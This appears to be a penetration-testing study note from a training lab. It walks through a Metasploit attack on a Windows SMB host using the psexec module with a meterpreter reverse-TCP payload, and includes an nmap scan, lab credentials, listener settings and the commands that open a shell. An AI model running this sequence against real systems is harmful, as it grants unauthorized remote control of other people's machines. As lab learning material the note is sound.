## Overview
- Metasploit provides modules for vulnerability exploitation, scanning, enumeration, payload delivery, and post-exploitation activities.
- The framework automates parts of the penetration-testing process, but the operator must still understand the target, the selected module, its requirements, and the consequences of executing it.

---
## Metasploit Module

| Module    | Purpose                                                                                      |
| --------- | -------------------------------------------------------------------------------------------- |
| Exploit   | Attempts to exploit a vulnerability or execute code through a particular attack vector       |
| Auxiliary | Performs tasks such as scanning, enumeration, and other supporting operations                |
| Payload   | Defines the code or functionality executed following successful exploitation                 |
| Post      | Performs actions after access has been obtained                                              |
| Encoder   | Transforms payload representations; encoding does not guarantee evasion of security controls |
| NOP       | Provides no-operation instructions used in certain exploit-development contexts              |

---
# Practicing metasploit

## Recon before module selection
```bash
nmap -sC -sV -Pn 10.129.164.25
PORT STATE SERVICE VERSION 
135/tcp open msrpc Microsoft Windows RPC 
139/tcp open netbios-ssn Microsoft Windows netbios-ssn 
445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
```
## Starting up metasploit
```bash
msfconsole
```

## Searching modules
```bash
# smb because 445 is smb port 
msf6 > search smb
```

## Try understand module path
```bash
56 exploit/windows/smb/psexec

# use for select the payload
use 56
```

| Component | Meaning                          |
| --------- | -------------------------------- |
| `56`      | Number for us to select it       |
| `exploit` | Type of module                   |
| `windows` | Target platform                  |
| `smb`     | Related service or attack vector |
| `psexec`  | tools name that get upload       |

## Module configuration

```bash
# show the options available needed to be set
msf6 exploit(windows/smb/psexec) > options
```
```bash
Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                                  no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBUser                                no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     68.183.42.102    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

### Setting options

```bash
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71 
RHOSTS => 10.129.180.71 
msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$ 
SHARE => ADMIN$ 
msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt! 
SMBPass => HTB_@cademy_stdnt! 
msf6 exploit(windows/smb/psexec) > set SMBUser htb-student 
SMBUser => htb-student 
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222 
LHOST => 10.10.14.222
```

### Exploits them
```bash
msf6 exploit(windows/smb/psexec) > exploit
```

### Interactive shell
```bash
meterpreter > shell
```

| Feature        | Meterpreter                                          | Shell                                        |
| -------------- | ---------------------------------------------------- | -------------------------------------------- |
| Execution      | In- memory and wrote nothing to disk                 | Spawn native OS process/terminal             |
| Encryption     | Built in TLS/HTTPS                                   | Unencrypted unless u wrapped them in SSH/TLS |
| Post Exploit   | Lot build in stuff like hashdump,migrate and capture | Relies on what the native OS got             |
| Detection Risk | Higher behaviour. Might raise lot EDR Flag           | Lower profile trigger.                       |
